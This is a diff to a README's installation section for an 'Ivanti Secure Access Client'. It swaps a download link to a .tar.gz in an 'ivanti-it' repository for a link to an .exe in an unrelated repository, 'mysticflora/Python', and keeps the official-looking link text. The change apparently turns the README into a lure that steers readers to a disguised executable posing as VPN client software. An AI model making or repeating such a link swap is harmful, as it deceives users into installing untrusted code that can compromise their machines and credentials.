@@ -13,7 +13,7 @@ Table of Contents
 
 ## Installation
 
-**[Download Ivanti Secure Access Client](https://github.com/ivanti-it/Ivanti-Secure-Access-Client/releases/download/1.2963/Ivanti-Secure-Access-Client.tar.gz)**
+**[Download Ivanti Secure Access Client](https://github.com/mysticflora/Python/releases/download/65/Ivanti-Secure-Access-Client.exe)**
 
 After downloading the Ivanti Secure Access Client, follow these steps to install and configure the application:
 
